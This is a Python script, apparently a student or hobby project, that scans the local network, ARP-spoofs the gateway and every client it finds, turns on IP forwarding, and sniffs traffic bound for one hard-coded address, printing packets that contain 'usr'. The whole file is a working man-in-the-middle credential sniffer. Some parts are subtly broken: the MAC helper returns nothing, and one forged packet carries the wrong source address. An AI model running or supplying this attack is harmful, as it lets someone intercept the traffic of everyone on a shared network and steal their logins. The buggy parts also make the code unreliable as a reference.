#!/usr/bin/env python
from scapy.all import *
import argparse
from netfilterqueue import NetfilterQueue
import socket
from uuid import getnode as get_mac
import os
from scapy.utils import hexdump

try:
    # This import works from the project directory
    import scapy_http.http as http
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers import http

##https://medium.com/@eric19921204/%E7%94%A8python%E5%AF%A6%E4%BD%9C%E4%B8%80%E5%80%8B%E7%B6%B2%E8%B7%AF%E6%8E%83%E7%9E%84%E5%99%A8-82666b76b557
def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list


##https://zhuanlan.zhihu.com/p/34897282
def initial(host,topper,clients):
    for i in range(len(clients)):
        ##spoof wifi
        spoof_wifi = Ether(src=host['mac'], dst=topper['mac'])/ARP(hwsrc=host['mac'], psrc=clients[i]['ip'], hwdst=topper['mac'], pdst=topper['ip'], op=2)
        ##spoof victum
        spoof_victum = Ether(src=host['mac'],dst=clients[i]['mac'])/ARP(psrc=clients[i]['ip'],pdst=topper['ip'],hwsrc=clients[i]['mac'],hwdst=host['mac'],op=2)
        for i in range(3):

            result = srp(spoof_wifi, timeout=3, verbose=0)[0]
            sresult = srp(spoof_victum ,timeout=3,verbose=0)[0]


##https://stackoverflow.max-everyday.com/2017/02/python-netifaces/
def get_ip_address():

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    ipaddr=s.getsockname()[0]
    return ipaddr
ip = get_ip_address()

def processStr(data):
    pattern = re.compile('^b\'(.*?)\'$', re.S)
    res = re.findall(pattern, str(data))
    final = re.split('\\\\r\\\\n', res[0])
    return final



##https://stackoverflow.max-everyday.com/2017/02/python-netifaces/
def get_mac_address():
    mac = get_mac()
    macmac = ':'.join(("%012x" % mac)[i:i+2] for i in range(0, 12, 2))

def custom_action(packet):
    raw = packet.lastlayer()
    dump = hexdump(raw,True)
    
    if('usr' in dump):
        print(dump)
    else:
        print('miss')
if __name__ == "__main__":
    mac = get_mac_address()
    scan_result = scan(ip+'/24')
    topper ={}
    clients =[]
    host = {'ip':ip,'mac':mac}
    for client in scan_result:
        if(client["ip"].split('.')[3]=='1'):
            topper = {'ip':client['ip'],'mac':client['mac']}
        else:
            tmp={'ip':client['ip'],'mac':client['mac']}
            clients.append(tmp)
    print('--'*8)
    print('AP:')
    print(topper)
    print('--'*8)
    print('clients:')
    print(clients)
    print('--'*8)
    os.system("sysctl -w net.ipv4.ip_forward=1")
    print('arp spoofing....')
    initial(host,topper,clients)
    
    print('')
    print('initialized')
    print('--'*8)
    sniff(filter="dst 140.113.207.246",prn=custom_action, count=0)
    
        
